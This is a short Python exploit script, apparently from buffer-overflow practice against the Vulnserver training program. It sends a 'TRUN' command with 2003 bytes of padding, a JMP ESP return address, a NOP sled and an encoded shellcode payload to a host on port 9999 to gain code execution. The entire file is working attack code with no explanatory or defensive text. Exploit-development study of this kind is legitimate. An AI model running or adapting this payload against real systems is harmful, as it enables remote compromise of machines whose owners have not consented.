import socket
import os
import sys

host="192.168.2.135"
port=9999

buf =  ""
buf += "\xdb\xd1\xd9\x74\x24\xf4\x5a\x2b\xc9\xbd\x0e\x55\xbd"
buf += "\x38\xb1\x52\x31\x6a\x17\x83\xc2\x04\x03\x64\x46\x5f"
buf += "\xcd\x84\x80\x1d\x2e\x74\x51\x42\xa6\x91\x60\x42\xdc"
buf += "\xd2\xd3\x72\x96\xb6\xdf\xf9\xfa\x22\x6b\x8f\xd2\x45"
buf += "\xdc\x3a\x05\x68\xdd\x17\x75\xeb\x5d\x6a\xaa\xcb\x5c"
buf += "\xa5\xbf\x0a\x98\xd8\x32\x5e\x71\x96\xe1\x4e\xf6\xe2"
buf += "\x39\xe5\x44\xe2\x39\x1a\x1c\x05\x6b\x8d\x16\x5c\xab"
buf += "\x2c\xfa\xd4\xe2\x36\x1f\xd0\xbd\xcd\xeb\xae\x3f\x07"
buf += "\x22\x4e\x93\x66\x8a\xbd\xed\xaf\x2d\x5e\x98\xd9\x4d"
buf += "\xe3\x9b\x1e\x2f\x3f\x29\x84\x97\xb4\x89\x60\x29\x18"
buf += "\x4f\xe3\x25\xd5\x1b\xab\x29\xe8\xc8\xc0\x56\x61\xef"
buf += "\x06\xdf\x31\xd4\x82\xbb\xe2\x75\x93\x61\x44\x89\xc3"
buf += "\xc9\x39\x2f\x88\xe4\x2e\x42\xd3\x60\x82\x6f\xeb\x70"
buf += "\x8c\xf8\x98\x42\x13\x53\x36\xef\xdc\x7d\xc1\x10\xf7"
buf += "\x3a\x5d\xef\xf8\x3a\x74\x34\xac\x6a\xee\x9d\xcd\xe0"
buf += "\xee\x22\x18\xa6\xbe\x8c\xf3\x07\x6e\x6d\xa4\xef\x64"
buf += "\x62\x9b\x10\x87\xa8\xb4\xbb\x72\x3b\x7b\x93\x7e\x39"
buf += "\x13\xe6\x7e\x2c\xb8\x6f\x98\x24\x50\x26\x33\xd1\xc9"
buf += "\x63\xcf\x40\x15\xbe\xaa\x43\x9d\x4d\x4b\x0d\x56\x3b"
buf += "\x5f\xfa\x96\x76\x3d\xad\xa9\xac\x29\x31\x3b\x2b\xa9"
buf += "\x3c\x20\xe4\xfe\x69\x96\xfd\x6a\x84\x81\x57\x88\x55"
buf += "\x57\x9f\x08\x82\xa4\x1e\x91\x47\x90\x04\x81\x91\x19"
buf += "\x01\xf5\x4d\x4c\xdf\xa3\x2b\x26\x91\x1d\xe2\x95\x7b"
buf += "\xc9\x73\xd6\xbb\x8f\x7b\x33\x4a\x6f\xcd\xea\x0b\x90"
buf += "\xe2\x7a\x9c\xe9\x1e\x1b\x63\x20\x9b\x2b\x2e\x68\x8a"
buf += "\xa3\xf7\xf9\x8e\xa9\x07\xd4\xcd\xd7\x8b\xdc\xad\x23"
buf += "\x93\x95\xa8\x68\x13\x46\xc1\xe1\xf6\x68\x76\x01\xd3"

# 77A373CD   FFE4             JMP ESP

buffer = "TRUN /.:/" + "A" * 2003 + "\xcd\x73\xa3\x77" + "\x90" * 16 +  buf + "C" * (5060 - 2003 - 4 - 16 - len(buf))

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect((host, port))
expl.send(buffer)
expl.close()
